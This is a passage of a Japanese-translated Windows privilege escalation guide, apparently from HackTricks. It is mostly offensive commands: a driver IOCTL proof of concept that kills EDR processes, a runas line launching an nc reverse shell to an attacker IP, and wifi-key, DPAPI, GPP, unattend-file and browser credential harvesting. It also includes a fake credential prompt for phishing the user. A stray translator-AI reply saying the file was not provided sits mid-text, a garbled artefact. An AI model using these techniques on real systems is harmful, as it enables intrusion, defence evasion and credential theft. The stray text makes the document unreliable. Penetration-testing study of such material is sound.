現代の hive 脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子孫を悪用し、カスタムドライバなしでメタデータ破損をカーネルの paged-pool オーバーフローに変換できます。完全なチェーンは以下を参照：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が欠落していることを悪用する（LPE + EDR kill）

一部の署名されたサードパーティ製ドライバは、IoCreateDeviceSecure を使って強力な SDDL でデバイスオブジェクトを作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがある。このフラグがないと、エクストラコンポーネントを含むパスでデバイスが開かれた場合に secure DACL が適用されず、権限のない任意のユーザが以下のような名前空間パスを使ってハンドルを取得できる：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

ユーザがデバイスを開けるようになると、ドライバが公開する特権 IOCTL を LPE や改ざんに悪用できる。実際に観測された例：
- 任意プロセスへフルアクセスハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない生ディスク読み書き（オフライン改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意プロセスを終了させる、これによりカーネル経由でユーザランドから AV/EDR を停止させることが可能になる。

最小限の PoC パターン（ユーザモード）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- DACLで制限することを想定したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセス終了やハンドルの返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs（access masks、METHOD_*、入力検証など）を制限し、直接カーネル権限を与えるのではなくブローカー型モデルを検討する。

Detection ideas for defenders
- 疑わしいデバイス名（e.g., \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可/拒否リストを維持する。


## PATH DLL Hijacking

もし **PATH に含まれるフォルダ内への書き込み権限** がある場合、プロセスにロードされる DLL をハイジャックして **権限を昇格させる** ことができる可能性がある。

PATH 内のすべてのフォルダの権限を確認する：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細は次を参照してください:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**の有無を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**このページでファイアウォール関連のコマンドを確認**](../basic-cmd-for-pentesters.md#firewall) **(ルールの表示、ルール作成、無効化、無効化...)**

さらに[ネットワーク列挙のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意の port で listen できます（最初に `nc.exe` を使って port を listen すると、GUI 経由で `nc` を firewall による許可を求められます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bashを簡単にrootとして起動するには、`--default-user root` を試してください

`WSL` のファイルシステムはフォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で参照できます。

## Windows の資格情報

### Winlogon の資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャ / Windows vault

出典: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault は、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を保存します。これらは **Windows** が **log in the users automaticall**y できるものです。一見すると、ユーザーが Facebook、Twitter、Gmail 等の認証情報を保存してブラウザ経由で自動ログインするように見えるかもしれませんが、そういう意味ではありません。

Windows Vault は、Windows が自動的にログインできる資格情報を保存します。つまり、任意の **Windows application that needs credentials to access a resource**（サーバーまたはウェブサイト）が **can make use of this Credential Manager** および Windows Vault を利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できる、ということです。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソースの資格情報を使用することはできないと思われます。したがって、アプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために **communicate with the credential manager and request the credentials for that resource** といった方法で Credential Manager と何らかの形で通信する必要があります。

マシンに保存されている資格情報を一覧表示するには `cmdkey` を使用してください。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプションと共に使用できます。次の例は、SMB 共有経由でリモートバイナリを呼び出すものです。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報セットを使って `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)など。

### DPAPI

**データ保護 API (DPAPI)** はデータの対称暗号化の手法を提供し、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用されます。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPI は、ユーザーのログインシークレットから派生した対称鍵を介して鍵の暗号化を可能にします**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに共存する DPAPI キー**は、通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用して復号できます。

マスターパスワードで保護された**資格情報ファイル**は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して、**mimikatz module** `dpapi::cred` を使って復号できます。\
`sekurlsa::dpapi` モジュール（root の場合）を使用すると、**extract many DPAPI** **masterkeys** from **memory** を抽出できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された資格情報を便利に保存する手段として、**scripting** や自動化タスクでよく使われます。これらの資格情報は **DPAPI** によって保護されており、通常は作成されたのと同じユーザーが同じコンピュータ上でのみ復号できます。

ファイルに含まれる PS credentials を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

これらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する。\
インストーラーは **SYSTEM privileges** で実行され、多くは **DLL Sideloading (情報元: [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc))**。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリの SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが動作しておらず、起動時に自動的に開始させたい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して ssh でマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称キー認証の間に `dpapi.dll` の使用を特定できませんでした。
 
### 無人応答ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル **SiteList.xml** を検索する

### Cached GPP パスワード

以前、Group Policy Preferences (GPP) を使用して複数のマシンにカスタムのローカル管理者アカウントを展開する機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は任意のドメインユーザーがアクセスできます。第二に、これらの GPP 内のパスワードは公開されているデフォルトキーを使って AES256 で暗号化されており、認証済みの任意のユーザーが復号できました。これにより、ユーザーが権限を昇格させる可能性があり、深刻なリスクとなっていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルのうち "cpassword" フィールドが空でないものをスキャンする関数が作成されました。該当するファイルを見つけると、その関数はパスワードを復号してカスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、この脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista より前）_ を検索して、以下のファイルを探す:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を要求する

ユーザーがそれを知っていると思う場合は、常に**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsを入力するよう頼む**ことができます（注意：クライアントに直接**尋ねること**で**credentials**を得るのは本当に**非常に危険**です）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

かつて**パスワード**が**clear-text**または**Base64**で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
指定されたファイル (src/windows-hardening/windows-local-privilege-escalation/README.md) の内容がこちらに提供されていません。ファイルの本文を貼り付けるか、翻訳してほしい該当ファイル群を送ってください。受け取り次第、指示どおり Markdown/HTML タグやパス・リンクを保持して英語→日本語に翻訳します。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の資格情報

ごみ箱も確認して、その中に資格情報がないか探してください

複数のプログラムに保存された **パスワードを復元する** には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

パスワードが保存されている可能性があるため、**Chrome or Firefox** のパスワードが格納されているデータベースを確認してください。ブラウザの履歴、ブックマーク、お気に入りも確認し、そこに**passwords are** 保存されているか確認してください。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows のオペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の**intercommunication** を可能にします。各 COM コンポーネントは **class ID (CLSID)** で識別され、各コンポーネントは1つ以上のインターフェースを通じて機能を公開し、それらは **interface IDs (IIDs)** で識別されます。

COM のクラスとインターフェースはそれぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを**overwrite any of the DLLs** できれば、その DLL が別のユーザーによって実行される場合に**escalate privileges** することが可能です。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### ファイルとレジストリ内の一般的なパスワード検索

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名やパスワードを探す**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインで、ターゲット内で **credentials を検索する** すべての metasploit POST モジュールを自動的に実行するために作られました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出するもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータをプレーンテキストで保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **セッション**、**ユーザー名**、**パスワード** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.  
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.  
[この脆弱性を**検出および悪用する方法**の詳細についてはこの例を参照してください。](leaked-handle-exploitation.md)  
[プロセスやスレッドの異なる権限レベルで継承されたより多くのオープンハンドラ（必ずしもfull accessだけでなく）をテストして悪用する方法について、より完全な説明はこちらの別の投稿を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

